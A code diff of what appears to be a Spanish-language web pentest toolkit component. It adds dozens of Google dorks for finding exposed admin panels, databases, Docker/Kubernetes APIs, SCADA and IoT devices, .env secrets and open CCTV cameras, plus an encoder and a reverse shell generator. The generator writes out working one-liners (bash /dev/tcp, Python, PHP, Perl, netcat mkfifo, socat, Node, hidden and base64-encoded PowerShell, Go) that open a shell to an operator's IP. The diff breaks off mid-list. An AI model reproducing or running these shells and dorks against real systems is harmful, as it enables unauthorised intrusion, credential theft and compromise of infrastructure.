@@ -5,8 +5,9 @@ import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { Copy, Check, ExternalLink, Search, Sparkles, Shield, Zap, Target, Eye, Lock, AlertTriangle, Database, Code, FileText, Globe, Github, Linkedin, Video } from "lucide-react"
+import { Copy, Check, ExternalLink, Search, Sparkles, Shield, Zap, Target, Eye, Lock, AlertTriangle, Database, Code, FileText, Globe, Github, Linkedin, Video, Bug, Wrench, Download, Terminal } from "lucide-react"
 import { sqlInjectionDorks, cctvDorks, lfiDorks, sensitiveDataDorks } from "@/components/dork-data/wordlist-categories"
+import { allPayloadCategories, type PayloadCategory } from "@/components/payload-data/attack-payloads"
 
 interface DorkCategory {
   title: string
@@ -14,6 +15,7 @@ interface DorkCategory {
   icon: React.ReactNode
   description: string
   color: string
+  group: string
 }
 
 const dorkCategories: DorkCategory[] = [
@@ -22,140 +24,160 @@ const dorkCategories: DorkCategory[] = [
     dorks: ["site:{domain} ext:php inurl:?"],
     icon: <Code className="h-4 w-4" />,
     description: "Discover PHP endpoints with parameters",
-    color: "bg-blue-500/10 text-blue-600 border-blue-500/20"
+    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
+    group: "Recon"
   },
   {
     title: "API Surface Mapping",
     dorks: ["site:{domain} inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3"],
     icon: <Globe className="h-4 w-4" />,
     description: "Map API endpoints and versions",
-    color: "bg-green-500/10 text-green-600 border-green-500/20"
+    color: "bg-green-500/10 text-green-600 border-green-500/20",
+    group: "Recon"
   },
   {
     title: "Sensitive File Discovery",
     dorks: ['site:"{domain}" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json'],
     icon: <FileText className="h-4 w-4" />,
     description: "Find configuration and sensitive files",
-    color: "bg-red-500/10 text-red-600 border-red-500/20"
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "Archivos"
   },
   {
     title: "Critical URL Tokens",
     dorks: ["inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:{domain}"],
     icon: <Target className="h-4 w-4" />,
     description: "Locate important URL patterns",
-    color: "bg-purple-500/10 text-purple-600 border-purple-500/20"
+    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
+    group: "Recon"
   },
   {
     title: "Error Pages & Traces",
     dorks: ['inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:{domain}'],
     icon: <AlertTriangle className="h-4 w-4" />,
     description: "Find error pages and stack traces",
-    color: "bg-orange-500/10 text-orange-600 border-orange-500/20"
+    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
+    group: "Recon"
   },
   {
     title: "XSS Parameters",
     dorks: ["inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:{domain}"],
     icon: <Zap className="h-4 w-4" />,
     description: "Identify potential XSS vectors",
-    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20"
+    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
+    group: "Web Vulns"
   },
   {
     title: "Redirect Parameters",
     dorks: ["inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:{domain}"],
     icon: <ExternalLink className="h-4 w-4" />,
     description: "Find redirect parameter vulnerabilities",
-    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20"
+    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
+    group: "Web Vulns"
   },
   {
     title: "SQL Injection Parameters",
     dorks: ["inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:{domain}"],
     icon: <Database className="h-4 w-4" />,
     description: "Common SQLi parameter patterns",
-    color: "bg-pink-500/10 text-pink-600 border-pink-500/20"
+    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
+    group: "Web Vulns"
   },
   {
     title: "SSRF Parameters",
     dorks: ["inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:{domain}"],
     icon: <Shield className="h-4 w-4" />,
     description: "Server-Side Request Forgery vectors",
-    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20"
+    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20",
+    group: "Web Vulns"
   },
   {
     title: "File Inclusion Candidates",
     dorks: ["inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:{domain}"],
     icon: <FileText className="h-4 w-4" />,
     description: "Local and remote file inclusion",
-    color: "bg-teal-500/10 text-teal-600 border-teal-500/20"
+    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
+    group: "Web Vulns"
   },
   {
     title: "Command Execution",
     dorks: ["inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:{domain}"],
     icon: <Zap className="h-4 w-4" />,
     description: "Remote command execution parameters",
-    color: "bg-red-500/10 text-red-600 border-red-500/20"
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "Web Vulns"
   },
   {
     title: "File Upload Discovery",
     dorks: ['site:{domain} intext:"choose file" | intext:"select file" | intext:"upload PDF"'],
     icon: <FileText className="h-4 w-4" />,
     description: "Find file upload functionality",
-    color: "bg-emerald-500/10 text-emerald-600 border-emerald-500/20"
+    color: "bg-emerald-500/10 text-emerald-600 border-emerald-500/20",
+    group: "Web Vulns"
   },
   {
     title: "API Documentation",
     dorks: ['inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer | inurl:redoc | inurl:openapi | intitle:"Swagger UI" site:"{domain}"'],
     icon: <Code className="h-4 w-4" />,
     description: "API docs and Swagger endpoints",
-    color: "bg-blue-500/10 text-blue-600 border-blue-500/20"
+    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
+    group: "Recon"
   },
   {
     title: "Authentication Endpoints",
     dorks: ["inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:{domain}"],
     icon: <Lock className="h-4 w-4" />,
     description: "Login and authentication pages",
-    color: "bg-slate-500/10 text-slate-600 border-slate-500/20"
+    color: "bg-slate-500/10 text-slate-600 border-slate-500/20",
+    group: "Recon"
   },
   {
     title: "Test & Staging Sites",
     dorks: ["inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:{domain}"],
     icon: <Eye className="h-4 w-4" />,
     description: "Development and testing environments",
-    color: "bg-amber-500/10 text-amber-600 border-amber-500/20"
+    color: "bg-amber-500/10 text-amber-600 border-amber-500/20",
+    group: "Recon"
   },
   {
     title: "Confidential Documents",
     dorks: ['site:{domain} ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx intext:"confidential" | intext:"Not for Public Release" | intext:"internal use only" | intext:"do not distribute"'],
     icon: <FileText className="h-4 w-4" />,
     description: "Sensitive document discovery",
-    color: "bg-rose-500/10 text-rose-600 border-rose-500/20"
+    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
+    group: "Archivos"
   },
   {
     title: "Personal Data Parameters",
     dorks: ["inurl:email= | inurl:phone= | inurl:name= | inurl:user= inurl:& site:{domain}"],
     icon: <Shield className="h-4 w-4" />,
     description: "URLs containing personal information",
-    color: "bg-violet-500/10 text-violet-600 border-violet-500/20"
+    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
+    group: "OSINT"
   },
   {
     title: "AEM Content Paths",
     dorks: ["inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:{domain}"],
     icon: <Globe className="h-4 w-4" />,
     description: "Adobe Experience Manager paths",
-    color: "bg-sky-500/10 text-sky-600 border-sky-500/20"
+    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
+    group: "CMS"
   },
   {
     title: "Vulnerability Reports",
     dorks: ['site:openbugbounty.org inurl:reports intext:"{domain}"'],
     icon: <AlertTriangle className="h-4 w-4" />,
     description: "Public vulnerability disclosures",
-    color: "bg-red-500/10 text-red-600 border-red-500/20"
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "OSINT"
   },
   {
     title: "Community Mentions",
     dorks: ['site:groups.google.com "{domain}"'],
     icon: <Globe className="h-4 w-4" />,
     description: "Google Groups discussions",
-    color: "bg-green-500/10 text-green-600 border-green-500/20"
+    color: "bg-green-500/10 text-green-600 border-green-500/20",
+    group: "OSINT"
   },
   {
     title: "Code Snippet Sites",
@@ -167,7 +189,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Code className="h-4 w-4" />,
     description: "Paste sites and code repositories",
-    color: "bg-blue-500/10 text-blue-600 border-blue-500/20"
+    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
+    group: "OSINT"
   },
   {
     title: "Cloud Storage Buckets",
@@ -187,21 +210,24 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Database className="h-4 w-4" />,
     description: "Cloud storage and bucket discovery",
-    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20"
+    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
+    group: "Cloud"
   },
   {
     title: "Package Repositories",
     dorks: ['site:jfrog.io "{domain}"'],
     icon: <Code className="h-4 w-4" />,
     description: "Artifactory and package repos",
-    color: "bg-purple-500/10 text-purple-600 border-purple-500/20"
+    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
+    group: "Cloud"
   },
   {
     title: "Firebase References",
     dorks: ['site:firebaseio.com "{domain}"'],
     icon: <Database className="h-4 w-4" />,
     description: "Firebase database references",
-    color: "bg-orange-500/10 text-orange-600 border-orange-500/20"
+    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
+    group: "Cloud"
   },
   {
     title: "Bug Bounty Programs",
@@ -216,7 +242,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Shield className="h-4 w-4" />,
     description: "Bug bounty and disclosure programs",
-    color: "bg-green-500/10 text-green-600 border-green-500/20"
+    color: "bg-green-500/10 text-green-600 border-green-500/20",
+    group: "OSINT"
   },
   {
     title: "Exposed Credentials",
@@ -231,7 +258,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Lock className="h-4 w-4" />,
     description: "Exposed passwords and secrets",
-    color: "bg-red-500/10 text-red-600 border-red-500/20"
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "Credenciales"
   },
   {
     title: "Configuration Secrets",
@@ -245,7 +273,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <FileText className="h-4 w-4" />,
     description: "Configuration files with secrets",
-    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20"
+    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
+    group: "Credenciales"
   },
   {
     title: "Backup Archives",
@@ -262,7 +291,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Database className="h-4 w-4" />,
     description: "Backup files and archives",
-    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20"
+    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20",
+    group: "Archivos"
   },
   {
     title: "Sensitive Documents",
@@ -277,7 +307,8 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <FileText className="h-4 w-4" />,
     description: "Publicly indexed sensitive docs",
-    color: "bg-rose-500/10 text-rose-600 border-rose-500/20"
+    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
+    group: "Archivos"
   },
   {
     title: "GitHub Leaks",
@@ -293,41 +324,243 @@ const dorkCategories: DorkCategory[] = [
     ],
     icon: <Github className="h-4 w-4" />,
     description: "GitHub repository leaks",
-    color: "bg-gray-500/10 text-gray-600 border-gray-500/20"
+    color: "bg-gray-500/10 text-gray-600 border-gray-500/20",
+    group: "Credenciales"
+  },
+  {
+    title: "Exposed Admin Panels",
+    dorks: [
+      `intitle:"Dashboard" inurl:jenkins site:{domain}`,
+      `intitle:"Jenkins" inurl:/jenkins site:{domain}`,
+      `intitle:"Jira" inurl:/jira site:{domain}`,
+      `intitle:"Confluence" inurl:/confluence site:{domain}`,
+      `intitle:"GitLab" inurl:/gitlab site:{domain}`,
+      `intitle:"Grafana" inurl:3000 site:{domain}`,
+      `intitle:"Kibana" inurl:5601 site:{domain}`,
+      `intitle:"Prometheus" inurl:9090 site:{domain}`,
+      `intitle:"Portainer" inurl:9000 site:{domain}`,
+      `intitle:"Rancher" inurl:rancher site:{domain}`,
+      `inurl:/wp-admin site:{domain}`,
+      `inurl:/admin/dashboard site:{domain}`,
+      `inurl:/manager/html intitle:"Tomcat" site:{domain}`,
+      `intitle:"phpMyAdmin" inurl:phpmyadmin site:{domain}`,
+      `intitle:"Adminer" inurl:adminer site:{domain}`,
+    ],
+    icon: <Shield className="h-4 w-4" />,
+    description: "Paneles de administración expuestos: Jenkins, Jira, Grafana, Kibana, etc.",
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Exposed Databases & Caches",
+    dorks: [
+      `intitle:"phpMyAdmin" "Welcome to phpMyAdmin" site:{domain}`,
+      `intitle:"Welcome to Adminer" site:{domain}`,
+      `intitle:"pgAdmin" inurl:pgadmin site:{domain}`,
+      `intitle:"RockMongo" inurl:rock site:{domain}`,
+      `intitle:"Elasticsearch" inurl:9200 site:{domain}`,
+      `inurl:9200/_cat/indices site:{domain}`,
+      `inurl:9200/_cluster/settings site:{domain}`,
+      `intitle:"Redis" inurl:6379 site:{domain}`,
+      `intitle:"CouchDB" inurl:5984 site:{domain}`,
+      `intitle:"InfluxDB" inurl:8086 site:{domain}`,
+      `inurl:8086/query?q=SHOW+DATABASES site:{domain}`,
+      `intitle:"Cassandra" inurl:8080 site:{domain}`,
+      `inurl:/_utils/ intitle:"CouchDB" site:{domain}`,
+      `intitle:"Mongo Express" inurl:8081 site:{domain}`,
+    ],
+    icon: <Database className="h-4 w-4" />,
+    description: "Bases de datos, caches y paneles de administración de BD expuestos",
+    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Kubernetes & Docker Exposed",
+    dorks: [
+      `intitle:"Kubernetes Dashboard" site:{domain}`,
+      `inurl:8001/api/v1 site:{domain}`,
+      `inurl:10250/pods site:{domain}`,
+      `inurl:2375/containers/json site:{domain}`,
+      `inurl:2376/containers/json site:{domain}`,
+      `inurl:4243/containers/json site:{domain}`,
+      `intitle:"Portainer" site:{domain}`,
+      `inurl:/api/v1/namespaces site:{domain}`,
+      `intitle:"Docker Registry" inurl:5000 site:{domain}`,
+      `inurl:5000/v2/_catalog site:{domain}`,
+      `intitle:"Lens" inurl:5500 site:{domain}`,
+      `inurl:etcd/v2/keys site:{domain}`,
+      `inurl:etcd/v3/kv site:{domain}`,
+    ],
+    icon: <Globe className="h-4 w-4" />,
+    description: "Dashboards de Kubernetes, APIs Docker y registros de contenedores expuestos",
+    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Jupyter & Notebooks Exposed",
+    dorks: [
+      `intitle:"Jupyter Notebook" site:{domain}`,
+      `inurl:/tree site:{domain} intitle:"Jupyter"`,
+      `inurl:/notebooks site:{domain} intitle:"Jupyter"`,
+      `intitle:"JupyterHub" site:{domain}`,
+      `intitle:"Apache Zeppelin" site:{domain}`,
+      `intitle:"Spark Master" site:{domain}`,
+      `intitle:"RStudio" inurl:8787 site:{domain}`,
+      `intitle:"Streamlit" site:{domain}`,
+      `inurl:8888/tree site:{domain}`,
+      `inurl:8888/notebooks site:{domain}`,
+      `inurl:/lab/workspaces site:{domain}`,
+    ],
+    icon: <Code className="h-4 w-4" />,
+    description: "Jupyter Notebooks, JupyterHub, Zeppelin y entornos data science expuestos",
+    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "WordPress Vulnerabilities",
+    dorks: [
+      `inurl:/wp-content/uploads site:{domain} filetype:php`,
+      `inurl:/wp-includes/wlwmanifest.xml site:{domain}`,
+      `inurl:/wp-json/wp/v2/users site:{domain}`,
+      `inurl:/?author= site:{domain}`,
+      `inurl:/wp-login.php site:{domain}`,
+      `inurl:/xmlrpc.php site:{domain}`,
+      `inurl:/wp-config.php.bak site:{domain}`,
+      `inurl:/wp-content/debug.log site:{domain}`,
+      `site:{domain} intext:"Powered by WordPress"`,
+      `inurl:/?p= inurl:/?cat= site:{domain}`,
+      `intitle:"WordPress" inurl:wp-admin site:{domain}`,
+      `inurl:/wp-content/uploads filetype:sql site:{domain}`,
+    ],
+    icon: <Globe className="h-4 w-4" />,
+    description: "Rutas sensibles de WordPress, XMLRPC, enumeración de usuarios y archivos expuestos",
+    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
+    group: "CMS"
+  },
+  {
+    title: "Exposed .git / .env / .DS_Store",
+    dorks: [
+      `inurl:"/.git" "index of" site:{domain}`,
+      `inurl:"/.git/HEAD" site:{domain}`,
+      `inurl:"/.git/config" site:{domain}`,
+      `inurl:"/.env" "DB_PASSWORD" site:{domain}`,
+      `inurl:"/.env" "APP_KEY" site:{domain}`,
+      `inurl:"/.env" "SECRET_KEY" site:{domain}`,
+      `inurl:"/.DS_Store" site:{domain}`,
+      `inurl:"/.svn/entries" site:{domain}`,
+      `inurl:"/.hg/manifest" site:{domain}`,
+      `inurl:"/Makefile" "secret" site:{domain}`,
+      `inurl:"/docker-compose.yml" site:{domain}`,
+      `inurl:"/docker-compose.yaml" site:{domain}`,
+      `inurl:"/.well-known/security.txt" site:{domain}`,
+      `inurl:"/CHANGELOG" inurl:"/VERSION" site:{domain}`,
+    ],
+    icon: <FileText className="h-4 w-4" />,
+    description: "Repositorios .git, archivos .env, .DS_Store y manifiestos de VCS expuestos en web",
+    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
+    group: "Archivos"
+  },
+  {
+    title: "IoT & Industrial Devices",
+    dorks: [
+      `intitle:"RouterOS" inurl:webfig site:{domain}`,
+      `intitle:"Cisco IOS" inurl:level site:{domain}`,
+      `intitle:"Fortinet" inurl:logincheck site:{domain}`,
+      `intitle:"pfSense" inurl:index.php site:{domain}`,
+      `intitle:"SonicWALL" inurl:auth.html site:{domain}`,
+      `intitle:"BIG-IP" inurl:tmui site:{domain}`,
+      `intitle:"Printer" inurl:hp/device site:{domain}`,
+      `intitle:"RICOH" inurl:web site:{domain}`,
+      `intitle:"SCADA" inurl:login site:{domain}`,
+      `intitle:"Siemens" inurl:portal site:{domain}`,
+      `intitle:"HMI" inurl:web site:{domain}`,
+      `inurl:/cgi-bin/webproc?getpage=html/index.html site:{domain}`,
+      `intitle:"Hikvision" inurl:doc/page site:{domain}`,
+      `intitle:"Dahua" inurl:RPC2 site:{domain}`,
+      `intitle:"Ubiquiti" inurl:devinfo site:{domain}`,
+    ],
+    icon: <Target className="h-4 w-4" />,
+    description: "Routers, firewalls, impresoras, SCADA, PLCs y dispositivos IoT/industriales expuestos",
+    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Cloud & Serverless Exposure",
+    dorks: [
+      `site:.azurewebsites.net "{domain}"`,
+      `site:.cloudapp.azure.com "{domain}"`,
+      `site:.azurefd.net "{domain}"`,
+      `site:.azurestaticapps.net "{domain}"`,
+      `site:.cloudfunctions.net "{domain}"`,
+      `site:.appspot.com "{domain}"`,
+      `site:.run.app "{domain}"`,
+      `site:.lambda-url.us-east-1.on.aws`,
+      `site:.execute-api.us-east-1.amazonaws.com`,
+      `site:*.s3.amazonaws.com "Access Denied"`,
+      `site:*.s3.amazonaws.com "NoSuchBucketPolicy"`,
+      `inurl:X-Amz-Credential site:{domain}`,
+      `inurl:AWSAccessKeyId= site:{domain}`,
+      `"arn:aws:" filetype:txt site:{domain}`,
+      `intitle:"Serverless Dashboard" site:{domain}`,
+    ],
+    icon: <Globe className="h-4 w-4" />,
+    description: "Funciones serverless, buckets S3 mal configurados y endpoints cloud expuestos",
+    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
+    group: "Cloud"
   },
   {
     title: "SQL Injection",
     dorks: sqlInjectionDorks,
     icon: <Database className="h-4 w-4" />,
     description: "Google dorks for SQL injection and vulnerable parameters",
-    color: "bg-pink-500/10 text-pink-600 border-pink-500/20"
+    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
+    group: "Web Vulns"
   },
   {
     title: "CCTV / Cámaras abiertas",
     dorks: cctvDorks,
     icon: <Video className="h-4 w-4" />,
     description: "Cámaras IP y streams accesibles (AXIS, ViewerFrame, etc.)",
-    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20"
+    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
+    group: "Infraestructura"
   },
   {
     title: "Local File Inclusion",
     dorks: lfiDorks,
     icon: <FileText className="h-4 w-4" />,
     description: "Parámetros típicos de LFI (page=, file=, include=, etc.)",
-    color: "bg-teal-500/10 text-teal-600 border-teal-500/20"
+    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
+    group: "Web Vulns"
   },
   {
     title: "Sensitive Data",
     dorks: sensitiveDataDorks,
     icon: <Lock className="h-4 w-4" />,
     description: "Datos sensibles, backups, passwords y configs expuestos",
-    color: "bg-rose-500/10 text-rose-600 border-rose-500/20"
+    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
+    group: "Archivos"
   },
 ]
 
 export function GoogleDorksGenerator() {
   const [domain, setDomain] = useState("")
   const [copiedIndex, setCopiedIndex] = useState<string | null>(null)
+  const [activeTab, setActiveTab] = useState<"dorks" | "payloads" | "tools">("dorks")
+  const [dorkFilter, setDorkFilter] = useState("all")
+  const [dorkSearch, setDorkSearch] = useState("")
+  const [payloadFilter, setPayloadFilter] = useState("all")
+  const [payloadSearch, setPayloadSearch] = useState("")
+  // Encoder/Decoder state
+  const [encInput, setEncInput] = useState("")
+  const [encOutput, setEncOutput] = useState("")
+  const [encCopied, setEncCopied] = useState(false)
+  // Reverse shell state
+  const [rsIP, setRsIP] = useState("")
+  const [rsPort, setRsPort] = useState("4444")
+  const [rsType, setRsType] = useState("bash-tcp")
+  const [rsCopied, setRsCopied] = useState(false)
+
+  const dorkGroups = ["all", "Recon", "Web Vulns", "Credenciales", "Archivos", "Infraestructura", "Cloud", "CMS", "OSINT"]
 
   const replaceDomain = (dork: string, inputDomain: string) => {
     // When no domain: strip optional " site:{domain}" so wordlist dorks work as global search
@@ -377,7 +610,6 @@ export function GoogleDorksGenerator() {
   }
 
   const openAllDorks = () => {
-    // Open all dorks from all categories
     dorkCategories.forEach((category) => {
       category.dorks.forEach((dork) => {
         const processedDork = replaceDomain(dork, domain)
@@ -385,6 +617,96 @@ export function GoogleDorksGenerator() {
         window.open(url, "_blank")
       })
     })
+  }
+
+  // ── Encoder / Decoder ──────────────────────────────────────────────────────
+  const runEncode = (type: string) => {
+    try {
+      let result = ""
+      switch (type) {
+        case "url-enc":    result = encodeURIComponent(encInput); break
+        case "url-dec":    result = decodeURIComponent(encInput); break
+        case "url-double": result = encodeURIComponent(encodeURIComponent(encInput)); break
+        case "b64-enc":    result = btoa(unescape(encodeURIComponent(encInput))); break
+        case "b64-dec":    result = decodeURIComponent(escape(atob(encInput))); break
+        case "html-enc":
+          result = encInput.replace(/[&<>"'`]/g, (c) =>
+            ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" }[c] ?? c))
+          break
+        case "html-dec":
+          result = encInput.replace(/&(amp|lt|gt|quot|#x27|#x60|#(\d+));/g, (_, e, num) =>
+            num ? String.fromCharCode(Number(num)) :
+            ({ amp: "&", lt: "<", gt: ">", quot: '"', "#x27": "'", "#x60": "`" }[e] ?? _))
+          break
+        case "hex-enc":
+          result = Array.from(encInput).map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("")
+          break
+        case "hex-dec":
+          result = (encInput.match(/.{1,2}/g) ?? []).map(h => String.fromCharCode(parseInt(h, 16))).join("")
+          break
+        case "unicode":
+          result = Array.from(encInput).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("")
+          break
+        case "js-escape":
+          result = Array.from(encInput).map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}`).join("")
+          break
+        default: result = encInput
+      }
+      setEncOutput(result)
+    } catch {
+      setEncOutput("⚠ Error: input inválido para esta operación")
+    }
+  }
+
+  const copyEncOutput = async () => {
+    await navigator.clipboard.writeText(encOutput)
+    setEncCopied(true)
+    setTimeout(() => setEncCopied(false), 2000)
+  }
+
+  // ── Reverse Shell Generator ────────────────────────────────────────────────
+  const reverseShells: Record<string, { label: string; cmd: (ip: string, port: string) => string }> = {
+    "bash-tcp":    { label: "Bash TCP",         cmd: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
+    "bash-udp":    { label: "Bash UDP",         cmd: (ip, p) => `bash -i >& /dev/udp/${ip}/${p} 0>&1` },
+    "sh-tcp":      { label: "sh TCP",           cmd: (ip, p) => `sh -i >& /dev/tcp/${ip}/${p} 0>&1` },
+    "python3":     { label: "Python 3",         cmd: (ip, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+    "python2":     { label: "Python 2",         cmd: (ip, p) => `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+    "php":         { label: "PHP",              cmd: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+    "php-proc":    { label: "PHP proc_open",    cmd: (ip, p) => `php -r '$s=fsockopen("${ip}",${p});$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
+    "perl":        { label: "Perl",             cmd: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
+    "ruby":        { label: "Ruby",             cmd: (ip, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
+    "nc-e":        { label: "Netcat -e",        cmd: (ip, p) => `nc -e /bin/sh ${ip} ${p}` },
+    "nc-mkfifo":   { label: "Netcat mkfifo",    cmd: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
+    "nc-openbsd":  { label: "Netcat (OpenBSD)", cmd: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -q1 ${ip} ${p} >/tmp/f` },
+    "socat":       { label: "Socat",            cmd: (ip, p) => `socat TCP:${ip}:${p} EXEC:/bin/sh` },
+    "socat-pty":   { label: "Socat PTY",        cmd: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
+    "node":        { label: "Node.js",          cmd: (ip, p) => `node -e "var n=require('net'),s=new n.Socket();s.connect(${p},'${ip}',function(){require('child_process').exec('/bin/sh',function(e,so,se){s.write(so+se)});});"` },
+    "java":        { label: "Java",             cmd: (ip, p) => `java -cp . Reverse ${ip} ${p}` },
+    "powershell":  { label: "PowerShell",       cmd: (ip, p) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
+    "ps-base64":   { label: "PowerShell B64",   cmd: (ip, p) => `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIke2lwfQAiACwAJHtwfQApADsA` },
+    "golang":      { label: "Go",               cmd: (ip, p) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
